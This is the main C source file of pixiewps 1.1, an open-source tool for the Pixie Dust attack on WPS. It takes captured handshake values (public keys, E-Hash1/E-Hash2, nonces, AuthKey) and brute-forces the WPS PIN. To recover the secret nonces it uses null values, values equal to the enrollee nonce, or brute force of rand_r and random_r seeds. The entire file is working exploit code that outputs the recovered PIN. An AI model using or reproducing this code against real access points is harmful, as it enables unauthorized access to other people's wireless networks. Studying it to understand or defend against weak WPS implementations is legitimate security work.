/*
 * pixiewps: bruteforce the wps pin exploiting the low or non-existing entropy of some APs (pixie dust attack).
 *           All credits for the research go to Dominique Bongard.
 *
 * Special thanks to: datahead, soxrok2212
 *
 * Copyright (c) 2015, wiire <wi7ire@gmail.com>
 * Version: 1.1
 *
 * DISCLAIMER: This tool was made for educational purposes only.
 *             The author is NOT responsible for any misuse or abuse.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 *
 * In addition, as a special exception, the copyright holders give
 * permission to link the code of portions of this program with the
 * OpenSSL library under certain conditions as described in each
 * individual source file, and distribute linked combinations
 * including the two.
 * You must obey the GNU General Public License in all respects
 * for all of the code used other than OpenSSL.  If you modify
 * file(s) with this exception, you may extend this exception to your
 * version of the file(s), but you are not obligated to do so.  If you
 * do not wish to do so, delete this exception statement from your
 * version.  If you delete this exception statement from all source
 * files in the program, then also delete it here.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <getopt.h>

#include <sys/time.h>
#include <asm/byteorder.h>

#include "pixiewps.h"
#include "random_r.h"
#include "utils.h"

int32_t rand_r(uint32_t *seed);

static const char *option_string = "e:r:s:z:a:n:m:b:Sfv:h?";
static const struct option long_options[] = {
	{ "pke",       required_argument, 0, 'e' },
	{ "pkr",       required_argument, 0, 'r' },
	{ "e-hash1",   required_argument, 0, 's' },
	{ "e-hash2",   required_argument, 0, 'z' },
	{ "authkey",   required_argument, 0, 'a' },
	{ "e-nonce",   required_argument, 0, 'n' },
	{ "r-nonce",   required_argument, 0, 'm' },
	{ "e-bssid",   required_argument, 0, 'b' },
	{ "dh-small",  no_argument,       0, 'S' },
	{ "force",     no_argument,       0, 'f' },
	{ "verbosity", required_argument, 0, 'v' },
	{ "help",      no_argument,       0, 'h' },
	{  0,          0,                 0,  0  }
};

int main(int argc, char **argv) {

	struct global *wps;
	if ((wps = calloc(1, sizeof(struct global)))) {
		wps->pke     = 0;
		wps->pkr     = 0;
		wps->e_hash1 = 0;
		wps->e_hash2 = 0;
		wps->authkey = 0;
		wps->e_nonce = 0;
		wps->r_nonce = 0;
		wps->e_bssid = 0;
		wps->psk1    = 0;
		wps->psk2    = 0;
		wps->dhkey   = 0;
		wps->kdk     = 0;
		wps->wrapkey = 0;
		wps->emsk    = 0;
		wps->e_s1    = 0;
		wps->e_s2    = 0;
		wps->bruteforce = false;
		wps->verbosity = 2;
		wps->error = calloc(256, 1); if (!wps->error) goto memory_err;
		wps->error[0] = '\n';
	} else {
		memory_err:
			fprintf(stderr, "\n [X] Memory allocation error!\n");
			return MEM_ERROR;
	}

	int opt = 0;
	int long_index = 0;
	opt = getopt_long(argc, argv, option_string, long_options, &long_index);

	while (opt != -1) {
		switch (opt) {
			case 'e':
				wps->pke = malloc(WPS_PUBKEY_LEN);
				if (!wps->pke)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->pke, WPS_PUBKEY_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad enrollee public key -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'r':
				wps->pkr = malloc(WPS_PUBKEY_LEN);
				if (!wps->pkr)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->pkr, WPS_PUBKEY_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad registrar public key -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 's':
				wps->e_hash1 = malloc(WPS_HASH_LEN);
				if (!wps->e_hash1)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_hash1, WPS_HASH_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad hash -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'z':
				wps->e_hash2 = malloc(WPS_HASH_LEN);
				if (!wps->e_hash2)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_hash2, WPS_HASH_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad hash -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'a':
				wps->authkey = malloc(WPS_AUTHKEY_LEN);
				if (!wps->authkey)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->authkey, WPS_HASH_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad authentication session key -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'n':
				wps->e_nonce = malloc(WPS_NONCE_LEN);
				if (!wps->e_nonce)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_nonce, WPS_NONCE_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad enrollee nonce -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'm':
				wps->r_nonce = malloc(WPS_NONCE_LEN);
				if (!wps->r_nonce)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->r_nonce, WPS_NONCE_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad registrar nonce -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'b':
				wps->e_bssid = malloc(WPS_BSSID_LEN);
				if (!wps->e_bssid)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_bssid, WPS_BSSID_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad enrollee MAC address -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'S':
				wps->small_dh_keys = true;
				break;
			case 'f':
				wps->bruteforce = true;
				break;
			case 'v':
				if (get_int(optarg, &wps->verbosity) != 0 || wps->verbosity < 1 || 3 < wps->verbosity) {
					snprintf(wps->error, 256, "\n [!] Bad verbosity level -- %s\n\n", optarg);
					goto usage_err;
				};
				break;
			case 'h':
				goto usage_err;
			case '?':
			default:
				fprintf(stderr, "%s -h for help\n", argv[0]);
				return ARG_ERROR;
		}
		opt = getopt_long(argc, argv, option_string, long_options, &long_index);
	}

	/* Not all required arguments have been supplied */
	if (wps->pke == 0 || wps->e_hash1 == 0 || wps->e_hash2 == 0) {
		wps->error = "\n [!] Not all required arguments have been supplied!\n\n";

		usage_err:
			fprintf(stderr, usage, VERSION, argv[0], wps->error);
			return ARG_ERROR;
	}

	/* If --dh-small is selected then no --pkr should be supplied */
	if (wps->pkr && wps->small_dh_keys) {
		wps->error = "\n [!] Options --dh-small and --pkr are mutually exclusive!\n\n";
		goto usage_err;
	}

	/* Either --pkr or --dh-small must be specified */
	if (!wps->pkr && !wps->small_dh_keys) {
		wps->error = "\n [!] Either --pkr or --dh-small must be specified!\n\n";
		goto usage_err;
	}

	if (wps->small_dh_keys) { /* Small DH keys selected */
		wps->pkr = malloc(WPS_PUBKEY_LEN);
		if (!wps->pkr)
			goto memory_err;

		/* g^A mod p = 2 (g = 2, A = 1, p > 2) */
		memset(wps->pkr, 0, WPS_PUBKEY_LEN - 1);
		wps->pkr[WPS_PUBKEY_LEN - 1] = 0x02;

		if (!wps->authkey) {
			if (wps->e_nonce) {
				if (wps->r_nonce) {
					if (wps->e_bssid) { /* Computing AuthKey */
						wps->dhkey = malloc(WPS_HASH_LEN);
						if (!wps->dhkey)
							goto memory_err;
						wps->kdk = malloc(WPS_HASH_LEN);
						if (!wps->kdk)
							goto memory_err;

						unsigned char *buffer = malloc(WPS_NONCE_LEN * 2 + WPS_BSSID_LEN);
						if (!buffer)
							goto memory_err;

						/* DHKey = SHA-256(g^(AB) mod p) = SHA-256(PKe^A mod p) = SHA-256(PKe) (g = 2, A = 1, p > 2) */
						sha256(wps->pke, WPS_PUBKEY_LEN, wps->dhkey);

						memcpy(buffer, wps->e_nonce, WPS_NONCE_LEN);
						memcpy(buffer + WPS_NONCE_LEN, wps->e_bssid, WPS_BSSID_LEN);
						memcpy(buffer + WPS_NONCE_LEN + WPS_BSSID_LEN, wps->r_nonce, WPS_NONCE_LEN);

						/* KDK = HMAC-SHA-256{DHKey}(Enrollee nonce || Enrollee MAC || Registrar nonce) */
						hmac_sha256(wps->dhkey, WPS_HASH_LEN, buffer, WPS_NONCE_LEN * 2 + WPS_BSSID_LEN, wps->kdk);

						buffer = realloc(buffer, WPS_HASH_LEN * 3);
						if (!buffer)
							goto memory_err;

						/* Key derivation function */
						kdf(wps->kdk, WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN + WPS_EMSK_LEN, buffer);

						wps->authkey = malloc(WPS_AUTHKEY_LEN);
						if (!wps->authkey)
							goto memory_err;

						memcpy(wps->authkey, buffer, WPS_AUTHKEY_LEN);
						
						if (wps->verbosity > 2) {
							wps->wrapkey = malloc(WPS_KEYWRAPKEY_LEN);
							if (!wps->wrapkey)
								goto memory_err;
							wps->emsk = malloc(WPS_EMSK_LEN);
							if (!wps->emsk)
								goto memory_err;

							memcpy(wps->wrapkey, buffer + WPS_AUTHKEY_LEN, WPS_KEYWRAPKEY_LEN);
							memcpy(wps->emsk, buffer + WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN, WPS_EMSK_LEN);
						}
						if (wps->verbosity < 3) {
							free(wps->dhkey);
							free(wps->kdk);
						}
						free(buffer);
					} else {
						wps->error = "\n [!] Neither --authkey and --e-bssid have been supplied!\n\n";
						goto usage_err;
					}
				} else {
					wps->error = "\n [!] Neither --authkey and --r-nonce have been supplied!\n\n";
					goto usage_err;
				}
			} else {
				wps->error = "\n [!] Neither --authkey and --e-nonce have been supplied!\n\n";
				goto usage_err;
			}
		}
	}

	/* E-S1 = E-S2 = 0 */
	wps->e_s1 = calloc(WPS_SECRET_NONCE_LEN, 1); if (!wps->e_s1) goto memory_err;
	wps->e_s2 = calloc(WPS_SECRET_NONCE_LEN, 1); if (!wps->e_s2) goto memory_err;

	/* Allocating memory for digests */
	wps->psk1 = malloc(WPS_HASH_LEN); if (!wps->psk1) goto memory_err;
	wps->psk2 = malloc(WPS_HASH_LEN); if (!wps->psk2) goto memory_err;

	unsigned char *result = (unsigned char *) malloc(WPS_HASH_LEN);
	if (!result)
		goto memory_err;
	unsigned char *buffer = (unsigned char *) malloc(WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN * 2);
	if (!buffer)
		goto memory_err;

	uint32_t seed;
	uint32_t print_seed; /* Seed to display at the end */
	unsigned int first_half;
	unsigned int second_half;
	unsigned char s_pin[4] = {0};
	bool valid = false;

	int mode = 1; bool found = false;
	struct timeval t0, t1;

	gettimeofday(&t0, 0);

	while (mode <= MAX_MODE && !found) {

		seed = 0; print_seed = 0;

		/* ES-1 = ES-2 = E-Nonce */
		if (mode == 2 && wps->e_nonce) {
			memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN);
			memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN);
		}

		/* PRNG bruteforce (rand_r) */
		if (mode == 3 && wps->e_nonce) {

			/* Reducing entropy from 32 to 25 bits */
			uint32_t index = wps->e_nonce[0] << 25;
			uint32_t limit = index | 0x01ffffff;

			while (1) {
				seed = index;

				int i;
				for (i = 1; i < WPS_NONCE_LEN; i++) {
					if (wps->e_nonce[i] != (unsigned char) rand_r(&seed)) break;
				}

				if (i == WPS_NONCE_LEN) { /* Seed found */
					print_seed = seed;

					/* Advance to get ES-1 */
					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
						wps->e_s1[i] = (unsigned char) rand_r(&seed);

					/* Advance to get ES-2 */
					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
						wps->e_s2[i] = (unsigned char) rand_r(&seed);

					break;
				}

				if (index == limit) break; /* Complete bruteforce exausted */

				index++;
			}
		}

		/* PRNG bruteforce (random_r) */
		if (mode == 4 && wps->e_nonce) {

			/* Checks if the sequence may actually be generated by current random function */
			if (wps->e_nonce[0] < 0x80 && wps->e_nonce[4] < 0x80 && wps->e_nonce[8] < 0x80  && wps->e_nonce[12] < 0x80) {

				valid = true;

				/* Converting enrollee nonce to the sequence may be generated by current random function */
				uint32_t randr_enonce[4] = {0};
				int j = 0;
				for (int i = 0; i < 4; i++) {
					randr_enonce[i] |= wps->e_nonce[j++];
					randr_enonce[i] <<= 8;
					randr_enonce[i] |= wps->e_nonce[j++];
					randr_enonce[i] <<= 8;
					randr_enonce[i] |= wps->e_nonce[j++];
					randr_enonce[i] <<= 8;
					randr_enonce[i] |= wps->e_nonce[j++];
				}

				uint32_t limit;
				struct timeval curr_time;
				gettimeofday(&curr_time, 0);

				if (wps->bruteforce) {
					seed = curr_time.tv_sec + SEC_PER_DAY * MODE4_DAYS - SEC_PER_HOUR * 2;
					limit = 0;
				} else {
					seed = curr_time.tv_sec + SEC_PER_HOUR * 2;
					limit = curr_time.tv_sec - SEC_PER_DAY * MODE4_DAYS - SEC_PER_HOUR * 2;
				}

				struct random_data *buf = (struct random_data *) calloc(1, sizeof(struct random_data));
				char *rand_statebuf = (char *) calloc(1, 128);
				initstate_r(seed, rand_statebuf, 128, buf);
				int32_t res = 0;

				while (1) {
					srandom_r(seed, buf);

					int i;
					for (i = 0; i < 4; i++) {
						random_r(buf, &res);
						if (res != randr_enonce[i]) break;
					}

					if (i == 4) {
						print_seed = seed;
						srandom_r(print_seed + 1, buf);
						for (int i = 0; i < 4; i++) {
							random_r(buf, &res);
							uint32_t be = __be32_to_cpu(res);
							memcpy(&(wps->e_s1[4 * i]), &be, 4);
							memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* ES-1 = ES-2 != E-Nonce */
						}
					}

					if (print_seed || seed == limit) {
						free(buf);
						free(rand_statebuf);
						break;
					}

					seed--;
				}
			}
		}

		/* WPS pin cracking */
		if (mode == 1 || (mode == 2 && wps->e_nonce) || (mode == 3 && print_seed) || (mode == 4 && print_seed)) {
crack:
			first_half = 0; second_half = 0;

			while (first_half < 10000) {
				uint_to_char_array(first_half, 4, s_pin);
				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, (unsigned char *) s_pin, 4, wps->psk1);
				memcpy(buffer, wps->e_s1, WPS_SECRET_NONCE_LEN);
				memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk1, WPS_PSK_LEN);
				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PUBKEY_LEN);
				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN, wps->pkr, WPS_PUBKEY_LEN);
				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN * 2, result);

				if (memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
					first_half++;
				} else {
					break;
				}
			}

			if (first_half < 10000) { /* First half found */
				unsigned char checksum_digit;
				unsigned int c_second_half;

				/* Testing with checksum digit */
				while (second_half < 1000) {
					checksum_digit = wps_pin_checksum(first_half * 1000 + second_half);
					c_second_half = second_half * 10 + checksum_digit;
					uint_to_char_array(c_second_half, 4, s_pin);
					hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, (unsigned char *) s_pin, 4, wps->psk2);
					memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
					memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
					memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PUBKEY_LEN);
					memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN, wps->pkr, WPS_PUBKEY_LEN);
					hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN * 2, result);

					if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
						second_half++;
					} else {
						second_half = c_second_half;
						found = true;
						break;
					}
				}

				/* Testing without checksum digit */
				if (!found) {
					second_half = 0;

					while (second_half < 10000) {

						/* If already tested skip */
						if (wps_pin_valid(first_half * 10000 + second_half)) {
							second_half++;
							continue;
						}

						uint_to_char_array(second_half, 4, s_pin);
						hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, (unsigned char *) s_pin, 4, wps->psk2);
						memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
						memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
						memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PUBKEY_LEN);
						memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN, wps->pkr, WPS_PUBKEY_LEN);
						hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN * 2, result);

						if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
							second_half++;
						} else {
							found = true;
							break;
						}
					}
				}
			}
		}

		/* E-S1 = E-Nonce != E-S2 */
		if (mode == 4 && print_seed && !found) {
			memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN);
			mode++;
			goto crack;
		}

		mode++;
	}

	gettimeofday(&t1, 0);
	long elapsed_s = t1.tv_sec - t0.tv_sec;
	mode--;

	printf("\n Pixiewps %s\n", VERSION);

	if (found) {
		if (wps->e_nonce) {
			if ((mode == 3 || mode == 4) && wps->verbosity > 2) {
				printf("\n [*] PRNG Seed:  %u", print_seed);
			}
			if (mode == 4 && wps->verbosity > 2) {
				time_t seed_time;
				struct tm ts;
				char buffer[30];

				seed_time = print_seed;
				ts = *localtime(&seed_time);
				strftime(buffer, 30, "%c", &ts);
				printf(" (%s)", buffer);
			}
		}
		if (wps->verbosity > 2) {
			if (wps->dhkey) { /* To see if AuthKey was supplied or not */
				printf("\n [*] DHKey:      "); byte_array_print(wps->dhkey, WPS_HASH_LEN);
				printf("\n [*] KDK:        "); byte_array_print(wps->kdk, WPS_HASH_LEN);
				printf("\n [*] AuthKey:    "); byte_array_print(wps->authkey, WPS_AUTHKEY_LEN);
				printf("\n [*] EMSK:       "); byte_array_print(wps->emsk, WPS_EMSK_LEN);
				printf("\n [*] KeyWrapKey: "); byte_array_print(wps->wrapkey, WPS_KEYWRAPKEY_LEN);
			}
			printf("\n [*] PSK1:       "); byte_array_print(wps->psk1, WPS_PSK_LEN);
			printf("\n [*] PSK2:       "); byte_array_print(wps->psk2, WPS_PSK_LEN);
		}
		if (wps->verbosity > 1) {
			printf("\n [*] E-S1:       "); byte_array_print(wps->e_s1, WPS_SECRET_NONCE_LEN);
			printf("\n [*] E-S2:       "); byte_array_print(wps->e_s2, WPS_SECRET_NONCE_LEN);
		}
		printf("\n [+] WPS pin:    %04u%04u", first_half, second_half);
	} else {
		printf("\n [-] WPS pin not found!");
	}
	printf("\n\n [*] Time taken: %lu s\n\n", elapsed_s);

	if (!found && mode == 4 && valid && !wps->bruteforce) {
		printf(" [!] The AP /might be/ vulnerable to mode 4. Try again with --force or with another (newer) set of data.\n\n");
	}

	free(result);
	free(buffer);

	free(wps->pke);
	free(wps->pkr);
	free(wps->e_hash1);
	free(wps->e_hash2);
	free(wps->authkey);
	free(wps->e_nonce);
	free(wps->r_nonce);
	free(wps->e_bssid);
	free(wps->psk1);
	free(wps->psk2);
	free(wps->e_s1);
	free(wps->e_s2);
	free(wps->error);

	if (wps->verbosity > 2) {
		free(wps->dhkey);
		free(wps->kdk);
		free(wps->wrapkey);
		free(wps->emsk);
	}

	free(wps);

	return (!found); /* 0 success, 1 failure */
}

/* Linear congruential generator */
int32_t rand_r(uint32_t *seed) {
	uint32_t s = *seed;
	uint32_t uret;

	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret = s & 0xffe00000;                 /* Use top 11 bits */
	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret += (s & 0xfffc0000) >> 11;        /* Use top 14 bits */
	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret += (s & 0xfe000000) >> (11 + 14); /* Use top 7 bits */

	*seed = s;
	return (int32_t) uret;
}

